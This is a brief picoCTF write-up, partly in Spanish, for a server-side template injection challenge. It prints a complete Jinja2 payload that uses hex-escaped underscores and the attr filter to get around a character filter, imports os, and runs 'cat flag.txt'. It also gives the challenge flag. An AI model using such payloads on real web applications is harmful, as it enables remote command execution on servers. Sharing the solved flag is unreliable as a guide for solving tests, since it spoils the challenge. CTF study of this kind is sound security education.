## Descripción:
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

# Solución
La clave fue utilizar **secuencias de escape hexadecimales** dentro de los strings para construir los nombres de atributos prohibidos, como `__globals__`. El carácter `_` se puede representar como `\x5f`.

Inyecté el siguiente payload completo en el formulario. Este payload navega por los objetos de la aplicación, importa el módulo `os` del sistema y lo usa para ejecutar `cat flag.txt`.

Django

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')()}}
```

El servidor procesó el payload, ejecutó el comando y devolvió la bandera como resultado.

Respuesta `picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}`

## Notas

## Referencias
 